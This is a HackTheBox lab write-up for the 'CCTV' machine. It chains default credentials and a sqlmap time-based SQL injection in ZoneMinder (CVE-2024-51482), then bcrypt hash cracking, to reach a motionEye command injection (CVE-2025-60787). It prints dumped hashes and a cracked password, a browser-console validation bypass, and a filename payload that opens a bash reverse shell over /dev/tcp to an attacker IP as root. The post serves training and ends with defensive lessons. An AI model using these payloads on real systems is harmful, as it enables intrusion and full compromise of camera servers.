---
title: CCTV
tags:
  - HackTheBox
  - Linux
  - SQL Injection
  - CVE-2024-51482
  - CVE-2025-60787
  - ZoneMinder
  - motionEye
  - Command Injection
  - Default Creds
  - Credential Cracking
categories:
  - HackTheBox
position: right
cover: '/img/cctv-cover.png'
description: 'HTB Easy Linux machine — default creds into ZoneMinder, time-based SQL injection (CVE-2024-51482) to dump password hashes, and root via motionEye command injection (CVE-2025-60787)'
date: 2026-07-11 17:30:00
---

> **Difficulty**: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; **OS**: <span style="color:#9fef00">Linux</span>

## Introduction

This machine demonstrates how chaining two recent vulnerabilities in **ZoneMinder** and **motionEye** leads to full root compromise. Starting from default credentials, a time-based SQL injection (**CVE-2024-51482**) was used to extract user hashes, followed by credential reuse and an OS command injection (**CVE-2025-60787**) to gain root access.

This walkthrough covers a realistic attack chain from initial access all the way to full system compromise.

<!-- more -->

---

## 1. Reconnaissance

The engagement began with standard service discovery. A quick `nmap` scan revealed two open ports:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.129.26.87
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-05 16:29 EDT
Nmap scan report for 10.129.26.87
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
```

- **Port 22 (SSH):** OpenSSH 9.6p1
- **Port 80 (HTTP):** Apache 2.4.58

After adding `cctv.htb` to my `/etc/hosts` file, I navigated to the web server and was greeted by a **ZoneMinder v1.37.63** login page.

![ZoneMinder v1.37.63 console, logged in with admin:admin](/img/cctv-zm-login.png)

In a classic "low-hanging fruit" moment, default credentials (`admin:admin`) worked perfectly, granting me access to the console. This highlights a common real-world misconfiguration where publicly exposed services rely on unchanged default credentials, effectively bypassing authentication controls.

---

## 2. Exploitation — CVE-2024-51482 (ZoneMinder Time-Based SQLi)

Knowing that ZoneMinder has had its share of vulnerabilities, I looked for recent CVEs and identified **CVE-2024-51482**, a time-based blind SQL injection in the `tid` parameter.

### Root Cause

The vulnerable code lives in `web/ajax/event.php`:

```php
case 'removetag' :
    $tagId = $_REQUEST['tid'];
    dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?', array($tagId, $_REQUEST['id']));
    $sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";
    $rowCount = dbNumRows($sql);
    if ($rowCount < 1) {
      $sql = 'DELETE FROM Tags WHERE Id = ?';
      $values = array($_REQUEST['tid']);
      $response = dbNumRows($sql, $values);
      ajaxResponse(array('response'=>$response));
    }
```

`$tagId` is concatenated directly into `$sql` without any parameterization or sanitization. Since no output is reflected back to the user, exploitation relies on time-based techniques (e.g. `SLEEP()`) to infer data through response delays — a boolean/time-based blind injection.

**Vulnerable endpoint:**

```plain text
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

### Dumping the Database

To exploit this, I grabbed my `ZMSESSID` cookie (`F12` → **Inspect** → **Application** tab → **Storage** → **Cookies**) and fired up `sqlmap`:

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=[REDACTED]" --dump -T Users -D zm
```

sqlmap identified the injection point by detecting delayed responses, confirming a time-based blind SQL injection. This method is inherently slow since each bit of data is inferred through timing differences rather than direct output — but it got there:

```plain text
[16:54:16] [INFO] resumed: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApWxcIFQcURnm5N.rhlULwM0jrtbm
[16:54:16] [INFO] resumed: superadmin
[16:54:16] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............. (done)
[16:54:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent po
tential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
05prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
[16:58:51] [INFO] retrieved: mark
[16:59:07] [INFO] retrieved: $2y$10$t5z8uIT.n9uCdHCNidcLF.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m

Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                      |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApWxcIFQcURnm5N.rhlULwM0jrtbm   |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.  |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLF.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m   |
+------------+--------------------------------------------------------------+
```

Three bcrypt hashes recovered: `superadmin`, `mark`, and `admin`.

---

## 3. Cracking and Lateral Movement

I focused on `mark`'s hash. The extracted hashes were bcrypt, which is intentionally slow to resist brute-force attacks. Using `hashcat` with `rockyou.txt`, the password for user `mark` was successfully cracked:

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 3200 mark_hash.txt /home/kali/Downloads/rockyou.txt
```

```plain text
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
...
Candidates.#01...: possum -> fatboy1
...
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame

Status...........: Cracked
```

Password for `mark` cracked as `opensesame` — indicating weak password selection despite strong hashing. Strong hashing alone is insufficient if users choose predictable passwords.

With these credentials I established an SSH session:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh mark@cctv.htb
```

Once inside, I checked for internal services with `ss -tlnp` and discovered **motionEye** running locally on port **8765**. This demonstrates a common security assumption: services bound to localhost are considered safe. However, once SSH access is obtained, these internal services become reachable and exploitable.

To reach the dashboard from my local machine, I set up an SSH tunnel (used local port `8766` since `8765` was already taken on my machine):

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -N -L 127.0.0.1:8766:127.0.0.1:8766 mark@cctv.htb
```

Navigating to `http://127.0.0.1:8766` brought me to the motionEye login page.

---

## 4. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)

To log in as admin, I read the `motion.conf` file on the target, which contained the admin password:

```bash
mark@cctv:~$ cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password
```

### Root Cause

**CVE-2025-60787** is a command injection vulnerability in motionEye. The web UI accepts arbitrary strings for fields such as **Image File Name** and writes them directly into `/etc/motioneye/camera-*.conf`. When motionEye restarts the underlying `motion` binary, these fields are treated as shell-expandable — so injected `$()`/backtick syntax executes as a shell command.

```plain text
Dashboard (Web UI)
      ↓
ConfigHandler.set_config()
      ↓
camera-*.conf written (unsanitized)
      ↓
motionctl.restart()
      ↓
motion parses config → executes payload
```

The web UI has **client-side only** JavaScript validation blocking shell metacharacters in the filename field — the server never re-validates the input. This is a classic trust boundary violation.

### The Bypass

I opened the browser console (`F12`) and redefined the validation function so it always passes:

```javascript
configUiValid = function() { return true; };
```

![Redefining the client-side validation function](/img/cctv-bypass-validation.png)

With the restriction lifted, I injected a reverse shell payload into **Still Images → Image File Name**, keeping the required `.%Y-%m-%d-%H-%M-%S` suffix so the field still "looks" valid to the app:

```plain text
$(python3 -c 'import os;os.system("bash -c \"bash -i >& /dev/tcp/10.10.15.36/4444 0>&1\""')).%Y-%m-%d-%H-%M-%S
```

The payload is wrapped in `$()` to force command execution in a subshell, while preserving the filename format expected by the application.

![Injecting the reverse shell payload into Image File Name](/img/cctv-payload-upload.png)

### Triggering Root

The payload only executes when a snapshot is actually taken. Since `motion` runs as **root**, this is the critical misconfiguration that enables privilege escalation — any command executed through this interface inherits root privileges, turning a simple command injection into a full system compromise.

I triggered the snapshot via the internal API:

```bash
mark@cctv:~$ curl "http://127.0.0.1:7999/1/action/snapshot"
```

Immediately, my listener caught the connection:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.36] from (UNKNOWN) [10.129.26.87] 47142
bash: cannot set terminal process group (5054): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# whoami
whoami
root
root@cctv:/etc/motioneye#
```

`whoami` → `root`. Full system compromise.

---

## Security Impact

This attack chain demonstrates how multiple low-to-medium severity issues combine into a critical compromise:

| Stage | Technique | CVE |
|---|---|---|
| **Initial access** | Default credentials (`admin:admin`) on ZoneMinder | — |
| **Credential exposure** | Time-based blind SQL injection in `tid` parameter | CVE-2024-51482 |
| **Account compromise** | Weak password, bcrypt hash cracked via hashcat + rockyou.txt | — |
| **Attack surface expansion** | Localhost-only motionEye service reachable post-SSH via tunnel | — |
| **Remote code execution as root** | Client-side-only validation bypass → command injection in filename field | CVE-2025-60787 |

This shows how chaining vulnerabilities is often more dangerous than individual flaws, as attackers rarely rely on a single point of failure.

## Key Takeaways

- **Default credentials are still a top-tier real-world risk.** Any publicly exposed admin panel with unchanged defaults is an instant foothold.
- **Never build raw SQL from user input.** `$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId"` is all it takes — parameterized queries would have closed CVE-2024-51482 entirely.
- **Localhost-bound services aren't inherently safe.** Once any form of shell access (even a low-privilege one) is achieved, "internal-only" services become part of the attack surface.
- **Client-side validation is not a security control.** motionEye's filename sanitization lived entirely in JavaScript — trivially bypassed from the browser console. The server must re-validate everything it will later execute or interpret.
- **Never let a privileged process (`motion` as root) act on unsanitized, attacker-influenced config values.**

---

Have a nice day, and see you in the next writeup!
Any feedback in the comments section is very appreciated. 🙏
